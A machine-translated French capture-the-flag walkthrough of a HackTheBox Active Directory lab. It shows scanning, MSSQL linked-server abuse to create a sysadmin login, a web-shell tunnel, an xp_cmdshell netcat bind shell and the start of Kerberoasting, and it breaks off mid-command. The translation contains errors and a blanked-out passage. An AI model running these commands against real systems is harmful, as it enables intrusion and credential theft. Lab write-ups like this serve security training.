<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤟🏼 🖐🏻 👨🏼‍💻 Fin de partie HackTheBox. Passage du laboratoire Opérations Offensives Professionnelles. Pentest Active Directory 🤲🏼 💰 👨🏾‍💼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, nous analyserons le passage non seulement d'une voiture, mais de tout un mini-laboratoire du site HackTheBox . 
 
 Comme indiqué dan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Fin de partie HackTheBox. Passage du laboratoire Opérations Offensives Professionnelles. Pentest Active Directory</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/504912/"><img src="https://habrastorage.org/webt/ll/db/pf/lldbpf9fosinylfhu1pqlufombu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous analyserons le passage non seulement d'une voiture, mais de tout un mini-laboratoire du site </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme indiqué dans la description, POO est conçu pour tester les compétences à toutes les étapes des attaques dans un petit environnement Active Directory. </font><font style="vertical-align: inherit;">L'objectif est de compromettre un hôte disponible, d'augmenter les privilèges et, finalement, de compromettre l'ensemble du domaine, tout en collectant 5 drapeaux. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommandé de ne pas se connecter à partir d'un ordinateur professionnel ou d'un hôte où les données importantes pour vous sont disponibles, car vous entrez dans un réseau privé avec des personnes qui connaissent quelque chose dans le domaine de la sécurité de l'information :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intro</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette fin de partie se compose de deux machines et contient 5 drapeaux. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jf/ta/u3/jftau3viawjhbuvlsvugzeynpsg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La description et l'adresse de l'hôte disponible sont également fournies. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/4a/nt/nf4antkct0nsupc1f1i1ormic8c.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Commençons!</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau de reconnaissance</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP de 10.13.38.11, que j'ajoute à / etc / hosts. </font></font><br>
<code>10.13.38.11 poo.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP à partir de l'interface tun0 à une vitesse de 500 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.11 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7g/cb/s5/7gcbs55h9-dell4qd-zignmaoeo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, pour des informations plus détaillées sur les services qui fonctionnent sur les ports, nous allons exécuter une analyse avec l'option -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A poo.htb -p80,1433</code></pre><br>
<img src="https://habrastorage.org/webt/y-/sk/ok/y-skokeizveewte_fltnom0okqu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, nous avons IIS et MSSQL. </font><font style="vertical-align: inherit;">Dans ce cas, nous découvrirons le vrai nom DNS du domaine et de l'ordinateur. </font><font style="vertical-align: inherit;">Sur le serveur Web, nous sommes accueillis par la page d'accueil d'IIS. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7r/_o/at/7r_oattpcdbijvqviryrkkkukuo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Passons en revue les répertoires. </font><font style="vertical-align: inherit;">J'utilise gobuster pour cela. </font><font style="vertical-align: inherit;">Dans les paramètres, nous indiquons le nombre de flux 128 (-t), URL (-u), dictionnaire (-w) et extensions qui nous intéressent (-x).</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u poo.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,aspx,html</code></pre><br>
<img src="https://habrastorage.org/webt/4x/vp/ne/4xvpne3jutiluh2kl2bhzfg0wui.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, nous avons l'authentification HTTP pour le répertoire / admin, ainsi qu'un fichier de référentiel de service de bureau disponible .DS_Store. .DS_Store - ce sont des fichiers qui stockent les paramètres utilisateur pour le dossier, comme une liste de fichiers, l'emplacement des icônes, l'image d'arrière-plan sélectionnée. Un tel fichier peut tomber dans le répertoire du serveur Web des développeurs Web. Ainsi, nous obtenons des informations sur le contenu du répertoire. Vous pouvez utiliser le </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">robot DS_Store pour cela</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<pre><code class="bash hljs">python3 dsstore_crawler.py -i http://poo.htb/</code></pre><br>
<img src="https://habrastorage.org/webt/77/zh/0r/77zh0rmu9cj-vabbdpm8jiaw8zi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous obtenons le contenu du répertoire. </font><font style="vertical-align: inherit;">La chose la plus intéressante ici est le répertoire / dev, à partir duquel nous pouvons voir les fichiers source et db dans deux branches. </font><font style="vertical-align: inherit;">Mais nous pouvons d'abord 6 caractères du nom des fichiers et répertoires si le service est vulnérable à IIS ShortName. </font><font style="vertical-align: inherit;">Pour vérifier cette vulnérabilité, utilisez le </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">scanner de noms abrégés IIS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ot/f0/p-/otf0p-hgyj8-j0jwomo0qkhwsi8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous allons à un fichier texte qui commence par «poo_co». </font><font style="vertical-align: inherit;">Ne sachant pas quoi faire ensuite, j'ai simplement sélectionné tous les mots commençant par «co» dans le dictionnaire du répertoire.</font></font><br>
<br>
<pre><code class="bash hljs">cat /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | grep -i <span class="hljs-string">"^co"</span> &gt; co_words.txt</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et parcourez wfuzz.</font></font><br>
<br>
<pre><code class="bash hljs">wfuzz -w ./co_words.txt -u <span class="hljs-string">"http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt"</span> --hc 404</code></pre><br>
<img src="https://habrastorage.org/webt/df/vp/i7/dfvpi7shl4g953vkrzy0dygx3lm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons le bon mot! </font><font style="vertical-align: inherit;">Nous regardons ce fichier, sauvegardons les informations d'identification (à en juger par le paramètre DBNAME, elles proviennent de MSSQL). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bz/uh/ma/bzuhma7s5vhi04vfjenyjszrf6y.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous remettons le drapeau et nous progressons de 20%.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jr/qw/8h/jrqw8h8m7zidufasmq00o2rxwwu.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau Huh</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous sommes connectés à MSSQL, j'utilise DBeaver. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mb/uz/oe/mbuzoecjnyrt8tudpdppjocedkq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous ne trouvons rien d'intéressant dans cette base de données, créons un éditeur SQL et vérifions ce que sont les utilisateurs.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> master..syslogins;</code></pre><br>
<img src="https://habrastorage.org/webt/gq/my/vo/gqmyvoomdmrrjgeijvtaupu3r0c.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons deux utilisateurs. </font><font style="vertical-align: inherit;">Vérifions nos privilèges.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>), is_srvrolemember(<span class="hljs-string">'dbcreator'</span>), is_srvrolemember(<span class="hljs-string">'bulkadmin'</span>), is_srvrolemember(<span class="hljs-string">'diskadmin'</span>), is_srvrolemember(<span class="hljs-string">'processadmin'</span>), is_srvrolemember(<span class="hljs-string">'serveradmin'</span>), is_srvrolemember(<span class="hljs-string">'setupadmin'</span>), is_srvrolemember(<span class="hljs-string">'securityadmin'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/l2/en/-m/l2en-mjodydm3nor3bzrmntm02u.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, il n'y a pas de privilèges. </font><font style="vertical-align: inherit;">Voyons les serveurs associés, à propos de cette technique que j'ai écrite en détail </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> master..sysservers;</code></pre><br>
<img src="https://habrastorage.org/webt/ib/8b/yz/ib8byzrmsrnehhyol8rcvhek09k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous trouvons donc un autre SQL Server. </font><font style="vertical-align: inherit;">Vérifions l'exécution des commandes sur ce serveur en utilisant openquery ().</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'select @@version as version'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/ui/-p/pz/ui-ppzlkg7nnonnt7ybzvk_lq-e.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous pouvons même créer un arbre de requête.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT version FROM openquery("COMPATIBILITY\POO_PUBLIC", ''select @@version as version'');'</span>);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le fait est que lorsque nous exécutons une demande à un serveur lié, la demande est exécutée dans le contexte d'un autre utilisateur! </font><font style="vertical-align: inherit;">Voyons dans le contexte de quel utilisateur nous travaillons sur un serveur lié.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT user_name() as name'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/gn/bk/pv/gnbkpv1aqvrqeeybcw3lva0zpvw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons maintenant dans quel contexte la requête du serveur lié au nôtre est exécutée!</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT name FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT user_name() as name'');'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/wx/yf/v3/wxyfv38lujrvb1zybe4eugmuq7c.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il s'agit donc d'un contexte DBO qui devrait disposer de tous les privilèges. </font><font style="vertical-align: inherit;">Vérifions les privilèges en cas de demande d'un serveur lié.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT * FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT is_srvrolemember(''''sysadmin''''), is_srvrolemember(''''dbcreator''''), is_srvrolemember(''''bulkadmin''''), is_srvrolemember(''''diskadmin''''), is_srvrolemember(''''processadmin''''), is_srvrolemember(''''serveradmin''''), is_srvrolemember(''''setupadmin''''), is_srvrolemember(''''securityadmin'''')'')'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/q8/f9/rf/q8f9rf6khxsnd-zhz-lzjo8pgmk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme vous pouvez le voir, nous avons tous les privilèges! </font><font style="vertical-align: inherit;">Créons notre administrateur de cette manière. </font><font style="vertical-align: inherit;">Mais ils ne le laissent pas passer par openquery, faisons-le via EXECUTE AT.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''CREATE LOGIN [ralf] WITH PASSWORD=N''''ralfralf'''', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''CREATE USER [ralf] FOR LOGIN [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''ALTER SERVER ROLE [sysadmin] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''ALTER ROLE [db_owner] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et maintenant que nous sommes connectés avec les informations d'identification du nouvel utilisateur, nous observons la nouvelle base de données des drapeaux. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vc/-j/qr/vc-jqrpv9wi1bxugpnohq1oblwc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous remettons ce drapeau et allons de l'avant.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bt/79/m8/bt79m8kpxd1njvb_qivfcfyiogm.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau de retour en arrière</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous obtenons le shell en utilisant MSSQL, j'utilise mssqlclient du paquet impacket.</font></font><br>
<br>
<pre><code class="bash hljs">mssqlclient.py ralf:ralfralf@poo.htb -db POO_PUBLIC</code></pre><br>
<img src="https://habrastorage.org/webt/vw/1m/5c/vw1m5c_5g6gunrmfrsvlcmiwocu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous devons obtenir des mots de passe, et la première chose que nous avons déjà rencontrée est le site. </font><font style="vertical-align: inherit;">Ainsi, nous avons besoin d'une configuration de serveur Web (il est impossible de lancer un shell pratique, apparemment le pare-feu fonctionne). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lu/np/fj/lunpfjjjb_skynbrs3aa4tgq_vw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais l'accès est refusé. </font><font style="vertical-align: inherit;">Bien que nous puissions lire le fichier depuis MSSQL, il vous suffit de savoir quels langages de programmation sont configurés. </font><font style="vertical-align: inherit;">Et dans le répertoire MSSQL, nous découvrons ce qu'est Python. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/b_/aa/yf/b_aayfsyx5g9tchc31vwmpl7j_0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lisez ensuite le fichier web.config, il n'y a pas de problème.</font></font><br>
<br>
<pre><code class="sql hljs">EXEC sp_execute_external_script<font></font>
@language = N'Python',<font></font>
@script = "print(open('C:\inetpub\wwwroot\web.config').read())"</code></pre><br>
<img src="https://habrastorage.org/webt/0-/ym/1a/0-ym1a-5vdoclblu5cf7dzlr2hu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Une fois les informations d'identification trouvées, accédez à / admin et récupérez l'indicateur.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5b/dw/1w/5bdw1wdytul7engqv7fsh5m6isg.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/g4/xx/sj/g4xxsjytoegqy6rj4qcq3vmkkz8.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau lisse</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En fait, il y a quelques inconvénients à utiliser un pare-feu, mais en regardant les paramètres réseau, nous remarquons que la perforation IPv6 est également utilisée! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mx/ow/ov/mxowovlytjpaivc7tita6skyevi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ajoutez cette adresse à / etc / hosts. </font></font><br>
<code>dead:babe::1001 poo6.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Analysons à nouveau l'hôte, mais en utilisant IPv6. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v-/kv/wx/v-kvwx7txlijyfcix-1ozsdpe1y.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et sur IPv6, le service WinRM est disponible. </font><font style="vertical-align: inherit;">Connectez-vous avec les informations d'identification trouvées. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gj/wv/oq/gjwvoqcwb7a3gxryr3pwanwhv98.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il y a un drapeau sur le bureau, nous le remettons.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/s4/ds/0d/s4ds0d0oeaxze0atpnany4mxyli.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau P00ned</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Après une reconnaissance sur l'hôte à l'aide de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pois chiches, nous</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ne trouvons rien de spécial. </font><font style="vertical-align: inherit;">Ensuite, il a été décidé de rechercher à nouveau les informations d'identification (j'ai également écrit </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">un article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sur ce sujet </font><font style="vertical-align: inherit;">). </font><font style="vertical-align: inherit;">Mais je n'ai pas réussi à obtenir tous les SPN du système via WinRM.</font></font><br>
<br>
<pre><code class="powershell hljs">setspn.exe <span class="hljs-literal">-T</span> intranet.poo <span class="hljs-literal">-Q</span> */*</code></pre><br>
<img src="https://habrastorage.org/webt/nx/ir/vo/nxirvooymoxzd2a3ykan9vjrxqk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Exécutons la commande via MSSQL. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v6/ss/p5/v6ssp5cszem2yonza1dqqffodwm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De cette façon, nous obtenons les SPN des utilisateurs p00_hr et p00_adm, ce qui signifie qu'ils sont vulnérables à une attaque telle que Kerberoasting. En bref, nous pouvons obtenir des hachages de leurs mots de passe. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous devez d'abord obtenir un shell stable au nom de l'utilisateur MSSQL. Mais comme notre accès est limité, nous n'avons accès à l'hôte que via les ports 80 et 1433. Mais il est possible de tunneler le trafic via le port 80! Pour ce faire, nous utilisons l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">application suivante</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Téléchargez le fichier tunnel.aspx dans le répertoire de base du serveur Web - C: \ inetpub \ wwwroot \. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ng/y6/tv/ngy6tv9oa8l03osxh8eeqb4wkz8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais lorsque nous essayons d'y accéder, nous obtenons l'erreur 404. Cela signifie que les fichiers * .aspx ne sont pas exécutés. Pour que les fichiers avec ces extensions commencent à s'exécuter, installez ASP.NET 4.5 comme suit.</font></font><br>
<br>
<pre><code class="powershell hljs">dism /online /<span class="hljs-built_in">enable-feature</span> /all /featurename:IIS<span class="hljs-literal">-ASPNET45</span></code></pre><br>
<img src="https://habrastorage.org/webt/sa/gg/qb/saggqboooa8-mixgpvgvdc3qpju.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/h6/zf/r0/h6zfr09aw4cjqej44_vr3mvgnzk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et maintenant, en accédant à tunnel.aspx, nous obtenons la réponse que tout est prêt à fonctionner. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xg/va/lk/xgvalkwby7e3xavkdejfve9csqm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lançons la partie client de l'application, qui traitera du relais du trafic. </font><font style="vertical-align: inherit;">Nous redirigerons tout le trafic du port 5432 vers le serveur.</font></font><br>
<br>
<pre><code class="bash hljs">python ./reGeorgSocksProxy.py -p 5432 -u http://poo.htb/tunnel.aspx</code></pre><br>
<img src="https://habrastorage.org/webt/cv/0i/q-/cv0iq-rnaufojba-cytfpf4ar_e.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous utilisons des chaînes de proxy pour envoyer du trafic vers n'importe quelle application via notre proxy. </font><font style="vertical-align: inherit;">Ajoutez ce proxy au fichier de configuration /etc/proxychains.conf. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/lm/bc/8clmbciziz9pxbcj2nqs6hpqtbg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous allons maintenant télécharger le programme </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sur le serveur </font><font style="vertical-align: inherit;">, à l'aide duquel nous allons créer un shell de liaison stable, et le </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">script Invoke-Kerberoast</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , avec lequel nous exécuterons l'attaque Kerberoasting. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4v/gv/ba/4vgvbaedkvn8dqgvybvcimejjkc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, via MSSQL, nous démarrons l'écouteur.</font></font><br>
<br>
<pre><code class="powershell hljs">xp_cmdshell C:\temp\nc64.exe <span class="hljs-literal">-e</span> powershell.exe <span class="hljs-literal">-lvp</span> <span class="hljs-number">4321</span></code></pre><br>
<img src="https://habrastorage.org/webt/dw/hz/dg/dwhzdgej2d3o0jrglizcambdwym.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et connectez-vous via notre proxy.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains rlwrap nc poo.htb 4321</code></pre><br>
<img src="https://habrastorage.org/webt/4w/7n/0e/4w7n0etds8_qa2gdphtohdzyibi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et prenons les hachages.</font></font><br>
<br>
<pre><code class="powershell hljs">. .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1
